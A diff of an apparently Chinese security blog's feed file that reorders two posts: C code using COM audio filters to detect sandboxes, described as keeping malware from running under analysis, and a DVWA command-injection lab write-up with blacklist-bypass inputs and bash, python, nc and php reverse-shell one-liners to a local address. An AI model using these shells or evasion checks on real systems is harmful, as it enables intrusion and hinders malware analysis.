@@ -75,31 +75,6 @@
   
   
   <entry>
-    <title>Com组建检测虚拟沙箱</title>
-    <link href="undefined2019/09/04/Com%E6%B7%BB%E5%8A%A0%E8%BF%87%E6%BB%A4%E5%99%A8%E6%9D%A5%E6%A3%80%E6%B5%8B%E6%B2%99%E7%AE%B1/"/>
-    <url>2019/09/04/Com%E6%B7%BB%E5%8A%A0%E8%BF%87%E6%BB%A4%E5%99%A8%E6%9D%A5%E6%A3%80%E6%B5%8B%E6%B2%99%E7%AE%B1/</url>
-    
-    <content type="html"><![CDATA[<p>因为沙箱的仿真度不全问题，可能造成仿真系统上的音频设备功能与真机的差异，通过这来实现检测是否在沙箱中运行。</p><p>但经测试 <code>any.run</code> 和<code>微步</code> 都未被识别为沙箱</p><p>这里只是介绍下可以使用COM对系统基础设备的操作，来检测虚拟沙箱。</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;conio.h&gt;#include &lt;windows.h&gt;#include &lt;dshow.h&gt;#include &lt;objbase.h&gt;#pragma comment(lib, &quot;Strmiids.lib&quot;)void useCom(){    /*    这些只是一些随机检查，以确保恶意软件在真实系统上执行。    只有安装了音频设备，此处的沙箱才会被视为真实系统。    大多数仿真器都会失败，因为几乎不可能为现代操作系统中的每个COM接口实现适当的支持。    */    CoInitialize(0);    wchar_t * filerName = L&quot;random_name&quot;;    IGraphBuilder * pGraph;    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&amp;pGraph);    if (E_POINTER != pGraph-&gt;AddFilter(NULL, filerName))    {        MessageBox(0,L&quot;E_POINTER != pGraph-&gt;AddFilter&quot;,0,0);        ExitProcess(-1);    }    //对一个简单的音频渲染器进行硝化，不检查错误代码，但是失败后pBaseFilter将被设置为NULL    IBaseFilter *pBaseFile;    CoCreateInstance(CLSID_AudioRender, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&amp;pBaseFile);    //试图找到刚刚添加的过滤器;如果以前未检查任何错误（或错误的仿真），此功能将无法找到过滤器，并且将成功检测到沙箱/仿真器。    pGraph-&gt;AddFilter(pBaseFile, filerName);    IBaseFilter *pBaseFile2;    pGraph-&gt;FindFilterByName(filerName, &amp;pBaseFile2);    if (pBaseFile2 == NULL)    {        MessageBox(0,L&quot;pBaseFile2==Null!!!&quot;,0,0);        ExitProcess(1);    }    //检查achName是不是之前添加的过滤器名    FILTER_INFO info = { 0 };    pBaseFile2-&gt;QueryFilterInfo(&amp;info);    if (wcscmp(info.achName,filerName)!=0)    {        MessageBox(0,L&quot;pBaseFile2 AddFilter error&quot;,0,0);        exit(0);    }    IReferenceClock *pClock;    if (pBaseFile2-&gt;GetSyncSource(&amp;pClock))    {        MessageBox(0,L&quot;pBaseFile2-&gt;GetSyncSource&quot;,0,0);        exit(0);    }    if (pClock != NULL)    {        exit(0);    }    CLSID clsID;    pBaseFile2-&gt;GetClassID(&amp;clsID);    if (clsID.Data1 == 0)    {        MessageBox(0,L&quot;pBaseFile2-&gt;GetClassID&quot;,0,0);        exit(1);    }    if (pBaseFile2 ==NULL)    {        MessageBox(0,L&quot;pBaseFile2 ==NULL&quot;,0,0);        exit(1);    }    IEnumPins *pEnum = NULL;    if (pBaseFile2-&gt;EnumPins(&amp;pEnum)!=0)    {        MessageBox(0,L&quot;pBaseFile2-&gt;EnumPins&quot;,0,0);        exit(-1);    }    //AddRef返回的引用计数必须大于0    if (pBaseFile2-&gt;AddRef() == 0)    {        MessageBox(0,L&quot;pBaseFile2-&gt;AddRef()&quot;,0,0);        exit(-1);    }}int _tmain(int argc, _TCHAR* argv[]){    useCom();    MessageBox(0,L&quot;没有沙箱!!!\n&quot;,0,0);    return 0;}</code></pre><p>IDA反编译结果</p><p><img src="https://img-blog.csdnimg.cn/20190905142026524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>]]></content>
-    
-    
-    <categories>
-      
-      <category>逆向</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>检测沙箱</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>H-WORM变种远控分析</title>
     <link href="undefined2019/09/04/H-WORM%E5%8F%98%E7%A7%8D%E8%BF%9C%E6%8E%A7%E5%88%86%E6%9E%90/"/>
     <url>2019/09/04/H-WORM%E5%8F%98%E7%A7%8D%E8%BF%9C%E6%8E%A7%E5%88%86%E6%9E%90/</url>
@@ -117,6 +92,31 @@
     <tags>
       
       <tag>Rat H-worm</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Com组建检测虚拟沙箱</title>
+    <link href="undefined2019/09/04/Com%E6%B7%BB%E5%8A%A0%E8%BF%87%E6%BB%A4%E5%99%A8%E6%9D%A5%E6%A3%80%E6%B5%8B%E6%B2%99%E7%AE%B1/"/>
+    <url>2019/09/04/Com%E6%B7%BB%E5%8A%A0%E8%BF%87%E6%BB%A4%E5%99%A8%E6%9D%A5%E6%A3%80%E6%B5%8B%E6%B2%99%E7%AE%B1/</url>
+    
+    <content type="html"><![CDATA[<p>因为沙箱的仿真度不全问题，可能造成仿真系统上的音频设备功能与真机的差异，通过这来实现检测是否在沙箱中运行。</p><p>但经测试 <code>any.run</code> 和<code>微步</code> 都未被识别为沙箱</p><p>这里只是介绍下可以使用COM对系统基础设备的操作，来检测虚拟沙箱。</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;conio.h&gt;#include &lt;windows.h&gt;#include &lt;dshow.h&gt;#include &lt;objbase.h&gt;#pragma comment(lib, &quot;Strmiids.lib&quot;)void useCom(){    /*    这些只是一些随机检查，以确保恶意软件在真实系统上执行。    只有安装了音频设备，此处的沙箱才会被视为真实系统。    大多数仿真器都会失败，因为几乎不可能为现代操作系统中的每个COM接口实现适当的支持。    */    CoInitialize(0);    wchar_t * filerName = L&quot;random_name&quot;;    IGraphBuilder * pGraph;    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&amp;pGraph);    if (E_POINTER != pGraph-&gt;AddFilter(NULL, filerName))    {        MessageBox(0,L&quot;E_POINTER != pGraph-&gt;AddFilter&quot;,0,0);        ExitProcess(-1);    }    //对一个简单的音频渲染器进行硝化，不检查错误代码，但是失败后pBaseFilter将被设置为NULL    IBaseFilter *pBaseFile;    CoCreateInstance(CLSID_AudioRender, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&amp;pBaseFile);    //试图找到刚刚添加的过滤器;如果以前未检查任何错误（或错误的仿真），此功能将无法找到过滤器，并且将成功检测到沙箱/仿真器。    pGraph-&gt;AddFilter(pBaseFile, filerName);    IBaseFilter *pBaseFile2;    pGraph-&gt;FindFilterByName(filerName, &amp;pBaseFile2);    if (pBaseFile2 == NULL)    {        MessageBox(0,L&quot;pBaseFile2==Null!!!&quot;,0,0);        ExitProcess(1);    }    //检查achName是不是之前添加的过滤器名    FILTER_INFO info = { 0 };    pBaseFile2-&gt;QueryFilterInfo(&amp;info);    if (wcscmp(info.achName,filerName)!=0)    {        MessageBox(0,L&quot;pBaseFile2 AddFilter error&quot;,0,0);        exit(0);    }    IReferenceClock *pClock;    if (pBaseFile2-&gt;GetSyncSource(&amp;pClock))    {        MessageBox(0,L&quot;pBaseFile2-&gt;GetSyncSource&quot;,0,0);        exit(0);    }    if (pClock != NULL)    {        exit(0);    }    CLSID clsID;    pBaseFile2-&gt;GetClassID(&amp;clsID);    if (clsID.Data1 == 0)    {        MessageBox(0,L&quot;pBaseFile2-&gt;GetClassID&quot;,0,0);        exit(1);    }    if (pBaseFile2 ==NULL)    {        MessageBox(0,L&quot;pBaseFile2 ==NULL&quot;,0,0);        exit(1);    }    IEnumPins *pEnum = NULL;    if (pBaseFile2-&gt;EnumPins(&amp;pEnum)!=0)    {        MessageBox(0,L&quot;pBaseFile2-&gt;EnumPins&quot;,0,0);        exit(-1);    }    //AddRef返回的引用计数必须大于0    if (pBaseFile2-&gt;AddRef() == 0)    {        MessageBox(0,L&quot;pBaseFile2-&gt;AddRef()&quot;,0,0);        exit(-1);    }}int _tmain(int argc, _TCHAR* argv[]){    useCom();    MessageBox(0,L&quot;没有沙箱!!!\n&quot;,0,0);    return 0;}</code></pre><p>IDA反编译结果</p><p><img src="https://img-blog.csdnimg.cn/20190905142026524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>检测沙箱</tag>
       
     </tags>
     
@@ -489,6 +489,37 @@
   
   
   <entry>
+    <title>web渗透基础三</title>
+    <link href="undefined2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9/"/>
+    <url>2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9/</url>
+    
+    <content type="html"><![CDATA[<h2 id="命令执行以及反弹shell姿势"><a href="#命令执行以及反弹shell姿势" class="headerlink" title="命令执行以及反弹shell姿势"></a>命令执行以及反弹shell姿势</h2><p>还是DVWA靶机的Command Injection</p><p>功能是在本地使用shell_exec执行ping命令</p><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {     // Get input     $target = $_REQUEST[ &#39;ip&#39; ];     // Determine OS and execute the ping command.     if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {         // Windows         $cmd = shell_exec( &#39;ping  &#39; . $target );     }     else {         // *nix         $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    }     // Feedback for the end user     echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; </code></pre><p>输入没有任何过滤，直接执行输入，这里要了解下<strong>命令链接符</strong><a href="https://www.cnblogs.com/Monarch-T/p/10388582.html" target="_blank" rel="noopener">参考</a></p><blockquote><p>&amp;&amp; :前一个指令执行成功，后面的指令才继续执行，就像进行与操作一样</p><p>|| :前一个命令执行失败，后面的才继续执行，类似于或操作</p><p>&amp; ：直接连接多个命令</p><p>| ：管道符，将前一个命令的输出作为下一个命令的输入</p><p>; ：直接连接多个命令</p></blockquote><p>我们尝试如下输入</p><p><code>127.0.0.1;ls</code></p><p>确实执行了我们的ls命令</p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>这里只贴添加的代码</p><pre><code>  $substitutions = array(         &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,         &#39;;&#39;  =&gt; &#39;&#39;,     );     // Remove any of the charactars in the array (blacklist).     $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</code></pre><p>添加了特定字符过滤，但是没过滤完整，也还是可以执行命令</p><p>如下命令都是可以执行的</p><pre><code>127.0.0.1&amp;ls127.0.0.A|ls127.0.0.A||ls</code></pre><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><pre><code> $substitutions = array(         &#39;&amp;&#39;  =&gt; &#39;&#39;,         &#39;;&#39;  =&gt; &#39;&#39;,         &#39;| &#39; =&gt; &#39;&#39;,  # | 后面多了个空格，导致|没被过滤        &#39;-&#39;  =&gt; &#39;&#39;,         &#39;$&#39;  =&gt; &#39;&#39;,         &#39;(&#39;  =&gt; &#39;&#39;,         &#39;)&#39;  =&gt; &#39;&#39;,         &#39;`&#39;  =&gt; &#39;&#39;,         &#39;||&#39; =&gt; &#39;&#39;,     );     // Remove any of the charactars in the array (blacklist).     $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</code></pre><p>漏洞见注释</p><p>可以使用<code>127.0.0.A|ls</code>命令执行</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>这里我也记录一下反弹shell<br><a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener">参考</a></p><h3 id="linux文件描述符"><a href="#linux文件描述符" class="headerlink" title="linux文件描述符"></a>linux文件描述符</h3><p>linux文件描述符：linux shell下有三种标准的文件描述符，分别如下：</p><ul><li>0 - stdin 代表标准输入,使用&lt;或&lt;&lt;</li><li>1 - stdout 代表标准输出,使用&gt;或&gt;&gt;</li><li>2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;</li></ul><p>还有就是&gt;&amp;这个符号的含义，最好的理解是这样的：</p><ul><li>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。</li><li>当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</li></ul><h3 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>开始之前都在本机开启一个监听，<code>nc -lnvp 8848</code></p><p><strong>注意：如果是对外网进行渗透，建议使用自己的服务器接收shell。否者可能会因为网关的nat导致连不上</strong></p><h4 id="linux机制版本"><a href="#linux机制版本" class="headerlink" title="linux机制版本"></a>linux机制版本</h4><p><code>bash -i &gt;&amp; /dev/tcp/192.168.0.5/8848 0&gt;&amp;1</code></p><h4 id="python-版本"><a href="#python-版本" class="headerlink" title="python 版本"></a>python 版本</h4><p><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.0.5&#39;,8848));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></p><h4 id="nc-版本"><a href="#nc-版本" class="headerlink" title="nc 版本"></a>nc 版本</h4><p>需要被攻击机安装nc，一般其他shell都不行可以试试这个，最后搏一搏。</p><p><code>nc -e /bin/bash 192.168.0.5 8848</code></p><h4 id="php-版本"><a href="#php-版本" class="headerlink" title="php 版本"></a>php 版本</h4><p><code>php- &#39;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.5/8848&quot;)&#39;</code></p><p><code>php -r &#39;$sock=fsockopen(&quot;192.168.0.5&quot;,8848);exec(&quot;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p>这里的3是代表之前创建的sock的文件描述符。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>DVWA</tag>
+      
+      <tag>php</tag>
+      
+      <tag>linux</tag>
+      
+      <tag>反弹shell</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>web渗透基础二</title>
     <link href="undefined2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
     <url>2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
@@ -506,37 +537,6 @@
     <tags>
       
       <tag>宽字节注入</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>web渗透基础三</title>
-    <link href="undefined2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9/"/>
-    <url>2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9/</url>
-    
-    <content type="html"><![CDATA[<h2 id="命令执行以及反弹shell姿势"><a href="#命令执行以及反弹shell姿势" class="headerlink" title="命令执行以及反弹shell姿势"></a>命令执行以及反弹shell姿势</h2><p>还是DVWA靶机的Command Injection</p><p>功能是在本地使用shell_exec执行ping命令</p><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {     // Get input     $target = $_REQUEST[ &#39;ip&#39; ];     // Determine OS and execute the ping command.     if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {         // Windows         $cmd = shell_exec( &#39;ping  &#39; . $target );     }     else {         // *nix         $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    }     // Feedback for the end user     echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; </code></pre><p>输入没有任何过滤，直接执行输入，这里要了解下<strong>命令链接符</strong><a href="https://www.cnblogs.com/Monarch-T/p/10388582.html" target="_blank" rel="noopener">参考</a></p><blockquote><p>&amp;&amp; :前一个指令执行成功，后面的指令才继续执行，就像进行与操作一样</p><p>|| :前一个命令执行失败，后面的才继续执行，类似于或操作</p><p>&amp; ：直接连接多个命令</p><p>| ：管道符，将前一个命令的输出作为下一个命令的输入</p><p>; ：直接连接多个命令</p></blockquote><p>我们尝试如下输入</p><p><code>127.0.0.1;ls</code></p><p>确实执行了我们的ls命令</p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>这里只贴添加的代码</p><pre><code>  $substitutions = array(         &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,         &#39;;&#39;  =&gt; &#39;&#39;,     );     // Remove any of the charactars in the array (blacklist).     $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</code></pre><p>添加了特定字符过滤，但是没过滤完整，也还是可以执行命令</p><p>如下命令都是可以执行的</p><pre><code>127.0.0.1&amp;ls127.0.0.A|ls127.0.0.A||ls</code></pre><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><pre><code> $substitutions = array(         &#39;&amp;&#39;  =&gt; &#39;&#39;,         &#39;;&#39;  =&gt; &#39;&#39;,         &#39;| &#39; =&gt; &#39;&#39;,  # | 后面多了个空格，导致|没被过滤        &#39;-&#39;  =&gt; &#39;&#39;,         &#39;$&#39;  =&gt; &#39;&#39;,         &#39;(&#39;  =&gt; &#39;&#39;,         &#39;)&#39;  =&gt; &#39;&#39;,         &#39;`&#39;  =&gt; &#39;&#39;,         &#39;||&#39; =&gt; &#39;&#39;,     );     // Remove any of the charactars in the array (blacklist).     $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</code></pre><p>漏洞见注释</p><p>可以使用<code>127.0.0.A|ls</code>命令执行</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>这里我也记录一下反弹shell<br><a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener">参考</a></p><h3 id="linux文件描述符"><a href="#linux文件描述符" class="headerlink" title="linux文件描述符"></a>linux文件描述符</h3><p>linux文件描述符：linux shell下有三种标准的文件描述符，分别如下：</p><ul><li>0 - stdin 代表标准输入,使用&lt;或&lt;&lt;</li><li>1 - stdout 代表标准输出,使用&gt;或&gt;&gt;</li><li>2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;</li></ul><p>还有就是&gt;&amp;这个符号的含义，最好的理解是这样的：</p><ul><li>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。</li><li>当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</li></ul><h3 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>开始之前都在本机开启一个监听，<code>nc -lnvp 8848</code></p><p><strong>注意：如果是对外网进行渗透，建议使用自己的服务器接收shell。否者可能会因为网关的nat导致连不上</strong></p><h4 id="linux机制版本"><a href="#linux机制版本" class="headerlink" title="linux机制版本"></a>linux机制版本</h4><p><code>bash -i &gt;&amp; /dev/tcp/192.168.0.5/8848 0&gt;&amp;1</code></p><h4 id="python-版本"><a href="#python-版本" class="headerlink" title="python 版本"></a>python 版本</h4><p><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.0.5&#39;,8848));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></p><h4 id="nc-版本"><a href="#nc-版本" class="headerlink" title="nc 版本"></a>nc 版本</h4><p>需要被攻击机安装nc，一般其他shell都不行可以试试这个，最后搏一搏。</p><p><code>nc -e /bin/bash 192.168.0.5 8848</code></p><h4 id="php-版本"><a href="#php-版本" class="headerlink" title="php 版本"></a>php 版本</h4><p><code>php- &#39;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.5/8848&quot;)&#39;</code></p><p><code>php -r &#39;$sock=fsockopen(&quot;192.168.0.5&quot;,8848);exec(&quot;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p>这里的3是代表之前创建的sock的文件描述符。</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>CTF</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>php</tag>
-      
-      <tag>linux</tag>
-      
-      <tag>DVWA</tag>
-      
-      <tag>反弹shell</tag>
       
     </tags>
     
